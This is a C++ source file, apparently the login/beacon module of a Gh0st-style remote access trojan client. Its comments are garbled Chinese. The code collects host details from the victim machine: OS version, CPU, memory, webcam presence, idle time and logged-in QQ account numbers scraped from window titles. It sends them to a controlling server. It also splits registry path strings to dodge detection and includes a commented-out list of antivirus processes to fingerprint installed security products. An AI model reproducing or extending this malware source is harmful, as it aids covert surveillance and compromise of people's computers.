
#include "LoginServer.h"
#include <string>
#include "RegEditEx.h"
#include <windows.h>
#include <process.h>
#include <tlhelp32.h>
#include "until.h"

//typedef struct
//{
//	char* Course;
//	char* Name;
//}AYSDFE;
//
//
//
//AYSDFE g_AntiVirus_Data[40] =
//{
//	{"360tray.exe",       "360��ȫ��ʿ"},
//	{"360sd.exe",         "360ɱ��"},
//	{"kxetray.exe",       "��ɽ����"},
//	{"KSafeTray.exe",     "��ɽ��ȫ��ʿ"},
//	{"QQPCRTP.exe",       "QQ���Թܼ�"},
//	{"HipsTray.exe",      "����"},
//	{"BaiduSd.exe",       "�ٶ�ɱ��"},
//	{"baiduSafeTray.exe", "�ٶ���ʿ"},
//	{"KvMonXP.exe",       "����"},
//	{"RavMonD.exe",       "����"},
//	{"QUHLPSVC.EXE",      "QuickHeal"},   //ӡ��
//	{"mssecess.exe",      "΢��MSE"},
//	{"cfp.exe",           "Comodoɱ��"},
//	{"SPIDer.exe",        "DR.WEB"},      //��֩��
//	{"acs.exe",           "Outpost"},
//	{"V3Svc.exe",         "����ʿV3"},
//	{"AYAgent.aye",       "��������"},
//	{"avgwdsvc.exe",      "AVG"},
//	{"f-secure.exe",      "F-Secure"},    //�Ұ�ȫ
//	{"avp.exe",           "����"},
//	{"Mcshield.exe",      "�󿧷�"},
//	{"egui.exe",          "NOD32"},
//	{"knsdtray.exe",      "��ţ"},
//	{"TMBMSRV.exe",       "����"},
//	{"avcenter.exe",      "С��ɡ"},
//	{"ashDisp.exe",       "Avast���簲ȫ"},
//	{"rtvscan.exe",       "ŵ��"},
//	{"remupd.exe",        "��è��ʿ"},
//	{"vsserv.exe",        "BitDefender"}, //BD  bdagent.exe
//	{"PSafeSysTray.exe",  "PSafe������"}, //����
//	{"ad-watch.exe",      "Ad-watch�����"},
//	{"K7TSecurity.exe",   "K7ɱ��"},
//	{"UnThreat.exe",      "UnThreat"},    //��������
//	{"  ",                "  "}
//};



DWORD CPUClockMHz()
{
	/*HKEY	hKey;
	DWORD	dwCPUMHz;
	DWORD	dwReturn = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE,
		"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
	RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMHz, &dwReturn);
	RegCloseKey(hKey);
	return	dwCPUMHz;*/
	char str1[256] = "~M";
	char str2[256] = "Hz";
	strcat(str1, str2);

	char str3[256] = "HARDWARE\\DESCRIPTION\\Sys";
	char str4[256] = "tem\\CentralProcessor\\0";
	strcat(str3, str4);

	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, str3, &hKey);
	RegQueryValueEx(hKey, str1, NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return	dwCPUMhz;
}

BOOL WebCamIsExist()
{
	BOOL	bOk = FALSE;

	char	szDeviceName[100], szVer[50];
	for (int i = 0; i < 10 && !bOk; ++i)
	{
		bOk = capGetDriverDescription(i, szDeviceName, sizeof(szDeviceName),
			//ϵͳ��API����
			szVer, sizeof(szVer));
	}
	return bOk;
}

//char* ssdd()
//{
//	static char AllName[1024];
//	int t = 0;
//	memset(AllName, 0, sizeof(AllName));
//	while (1)
//	{
//		if (strstr(g_AntiVirus_Data[t].Course, " ") == 0)
//		{
//			if (GetProcessID(g_AntiVirus_Data[t].Course))
//			{
//				lstrcat(AllName, g_AntiVirus_Data[t].Name);
//				lstrcat(AllName, " ");
//			}
//		}
//		else
//			break;
//		t++;
//	}
//
//	if (strstr(AllName, " ") == 0)
//	{
//		lstrcat(AllName, "��δ����");
//	}
//
//	return AllName;
//}



std::string getSystemName2()
{
	std::string vname("δ֪����ϵͳ");
	//���ж��Ƿ�Ϊwin8.1��win10
	typedef void(__stdcall*NTPROC)(DWORD*, DWORD*, DWORD*);
	HINSTANCE hinst = LoadLibrary("ntdll.dll");
	DWORD dwMajor, dwMinor, dwBuildNumber;
	NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers"); 
	proc(&dwMajor, &dwMinor, &dwBuildNumber); 
	if (dwMajor == 6 && dwMinor == 3)	//win 8.1
	{
		vname = "Windows 8.1";
		printf_s("�˵��Եİ汾Ϊ:%s\n", vname.c_str());
		return vname;
	}
	if (dwMajor == 10 && dwMinor == 0)	//win 10
	{
		vname = "Windows 10";
		printf_s("�˵��Եİ汾Ϊ:%s\n", vname.c_str());
		return vname;
	}
	//���治���ж�Win Server����Ϊ���˻�δ������ϵͳ�Ļ��ӣ���ʱ������

	//�ж�win8.1���µİ汾
	SYSTEM_INFO info;                //��SYSTEM_INFO�ṹ�ж�64λAMD������
	GetSystemInfo(&info);            //����GetSystemInfo�������ṹ
	OSVERSIONINFOEX os;
	os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	if (GetVersionEx((OSVERSIONINFO *)&os))
	{
		//������ݰ汾��Ϣ�жϲ���ϵͳ����
		switch (os.dwMajorVersion)
		{                    //�ж����汾��
		case 4:
			switch (os.dwMinorVersion)
			{                //�жϴΰ汾��
			case 0:
				if (os.dwPlatformId == VER_PLATFORM_WIN32_NT)
					vname ="Windows NT 4.0";  //1996��7�·���
				else if (os.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
					vname = "Windows 95";
				break;
			case 10:
				vname ="Windows 98";
				break;
			case 90:
				vname = "Windows Me";
				break;
			}
			break;
		case 5:
			switch (os.dwMinorVersion)
			{               //�ٱȽ�dwMinorVersion��ֵ
			case 0:
				vname = "Windows 2000";    //1999��12�·���
				break;
			case 1:
				vname = "Windows XP";      //2001��8�·���
				break;
			case 2:
				if (os.wProductType == VER_NT_WORKSTATION &&
					info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
					vname = "Windows XP Professional x64 Edition";
				else if (GetSystemMetrics(SM_SERVERR2) == 0)
					vname = "Windows Server 2003";   //2003��3�·���
				else if (GetSystemMetrics(SM_SERVERR2) != 0)
					vname = "Windows Server 2003 R2";
				break;
			}
			break;
		case 6:
			switch (os.dwMinorVersion)
			{
			case 0:
				if (os.wProductType == VER_NT_WORKSTATION)
					vname = "Windows Vista";
				else
					vname = "Windows Server 2008";   //�������汾
				break;
			case 1:
				if (os.wProductType == VER_NT_WORKSTATION)
					vname = "Windows 7";
				else
					vname = "Windows Server 2008 R2";
				break;
			case 2:
				if (os.wProductType == VER_NT_WORKSTATION)
					vname = "Windows 8";
				else
					vname = "Windows Server 2012";
				break;
			}
			break;
		default:
			vname = "δ֪����ϵͳ";
		}
		printf_s("�˵��Եİ汾Ϊ:%s\n", vname.c_str());
	}
	else
		printf_s("�汾��ȡʧ��\n");
	return vname;
}

UINT GetHostRemark(LPTSTR lpBuffer, UINT uSize)
{
	LPCTSTR lpServiceName = "gfi";
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char*)lpBuffer, NULL, uSize, 0);
	
	if (lstrlen(lpBuffer) == 0)
		gethostname(lpBuffer, uSize);

	return lstrlen(lpBuffer);
}

BOOL IsWindows64()
{

	typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
	LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)::GetProcAddress(GetModuleHandle("kernel32.dll"), "IsWow64Process");
	BOOL bIsWow64 = FALSE;
	if (fnIsWow64Process)
		if (!fnIsWow64Process(::GetCurrentProcess(), &bIsWow64))
			bIsWow64 = FALSE;
	return bIsWow64;
}
void clean_string(char* str)//ȥ��β�ո�
{
	char* start = str - 1;
	char* end = str;
	char* p = str;
	while (*p)
	{
		switch (*p)
		{
		case ' ':
		case '\r':
		case '\n':
		{
			if (start + 1 == p)
				start = p;
		}
		break;
		default:
			break;
		}
		++p;
	}
	//�����������ַ�����β�� ������ǰ
	--p;
	++start;
	if (*start == 0)
	{
		//�Ѿ����ַ�����ĩβ�� 
		*str = 0;
		return;
	}
	end = p + 1;
	while (p > start)
	{
		switch (*p)
		{
		case ' ':
		case '\r':
		case '\n':
		{
			if (end - 1 == p)
				end = p;
		}
		break;
		default:
			break;
		}
		--p;
	}
	memmove(str, start, end - start);
	*(str + (int)end - (int)start) = 0;
}
char* GetQQ()
{
	char QQ[MAX_PATH] = { 0 };
	char szText[MAX_PATH] = "CTXOPConntion_Class";
	char szQQNumber[MAX_PATH] = { 0 };
	HWND hWnd = FindWindow(szText, NULL);
	while (hWnd)
	{
		if (strcmp(szText, "CTXOPConntion_Class") == 0)
		{
			GetWindowText(hWnd, szText, MAX_PATH);
			int len = strlen(szText);
			do
			{
				len--;
			} while (szText[len] != '_');
			strcpy(szQQNumber, &szText[len + 1]);
			strcat(QQ, szQQNumber);
			strcat(QQ, " ");
		}
		hWnd = GetWindow(hWnd, GW_HWNDNEXT);
		GetClassName(hWnd, szText, MAX_PATH);
	}
	CloseHandle(hWnd);
	clean_string(QQ);
	if (strlen(QQ) > 4)
		return QQ;
	else
		return "NULL";
}

#include <wininet.h>
TCHAR* ConnectionKind()
{
	DWORD flags;
	if (InternetGetConnectedState(&flags, 0))
	{
		if ((flags & INTERNET_CONNECTION_MODEM) == INTERNET_CONNECTION_MODEM)
		{
			return _T("MODEM ����");
		}
		else if ((flags & INTERNET_CONNECTION_LAN) == INTERNET_CONNECTION_LAN)
		{
			return _T("LAN ����");
		}
		else if ((flags & INTERNET_CONNECTION_PROXY) == INTERNET_CONNECTION_PROXY)
		{
			return _T("PROXY ����");
		}
		else if ((flags & INTERNET_CONNECTION_MODEM_BUSY) == INTERNET_CONNECTION_MODEM_BUSY)
		{
			return _T("BUSY ����");
		}
		else
			return _T("OTHER ����");
	}
	return _T("OTHER ����");
}
int sendLoginInfo(CClientSocket* ClientObject,DWORD dwSpeed)
{
	LOGIN_INFOR  LoginInfor = {0};
	LoginInfor.bToken = TOKEN_LOGIN; // ����Ϊ��¼
	//��ò���ϵͳ��Ϣ
	//strcpy_s(LoginInfor.OsVerInfoEx, getSystemName().c_str());

	////���PCName
	//char szPCName[MAX_PATH] = {0};
	//gethostname(szPCName, MAX_PATH);  
	// ������
	char szPCName[256];
	GetHostRemark(szPCName, sizeof(szPCName));



	//���ClientIP
	sockaddr_in  ClientAddr;
	memset(&ClientAddr, 0, sizeof(ClientAddr));
	int iLen = sizeof(sockaddr_in);
	getsockname(ClientObject->m_Socket, (SOCKADDR*)&ClientAddr, &iLen);
	memcpy(&LoginInfor.IPAddress, (void*)&ClientAddr.sin_addr, sizeof(IN_ADDR));

	// �ж� �ǲ��� 64λϵͳ
	LoginInfor.bIsWow64 = IsWindows64();


	// �û�״̬
	LoginInfor.bIsActive = false;
	//�Ƿ�
	LASTINPUTINFO lpi;
	lpi.cbSize = sizeof(lpi);
	GetLastInputInfo(&lpi);//��ȡ�ϴ����������ʱ�䡣
	if ((::GetTickCount() - lpi.dwTime) > 1000 * 60 * 3)//5����
	{
		//��ǰϵͳ�Ѿ�������1����
		LoginInfor.bIsActive = true;
	}

	// ��ȡQq
	lstrcpy(LoginInfor.szQQNum, GetQQ());

	// ɱ�����
	//strcpy(LoginInfor.Virus, ssdd());

	//net
	lstrcpy(LoginInfor.sznet, ConnectionKind());
	DWORD	dwCPUMHz;
	dwCPUMHz = CPUClockMHz();
	//
	SYSTEM_INFO SysInfo;//���ڻ�ȡCPU������
	GetSystemInfo(&SysInfo);
	LoginInfor.nCPUNumber = SysInfo.dwNumberOfProcessors;


		// �ڴ�
	MEMORYSTATUSEX	MemInfo; //��GlobalMemoryStatusEx����ʾ2G�����ڴ�
	MemInfo.dwLength = sizeof(MemInfo);
	GlobalMemoryStatusEx(&MemInfo);
	DWORDLONG strMem = MemInfo.ullTotalPhys / 1024 / 1024;
	LoginInfor.MemSize = (unsigned long)strMem;







	BOOL bWebCamIsExist = WebCamIsExist();

	memcpy(LoginInfor.szPCName,szPCName,MAX_PATH);
	LoginInfor.dwSpeed  = dwSpeed;
	LoginInfor.dwCPUMHz = dwCPUMHz;
	LoginInfor.ClientAddr = ClientAddr.sin_addr;
	LoginInfor.bWebCamIsExist = bWebCamIsExist;
	int nan1 = sizeof(LOGIN_INFOR);
	int iRet = ClientObject->Send((LPBYTE)&LoginInfor, sizeof(LOGIN_INFOR));

	return iRet;
}

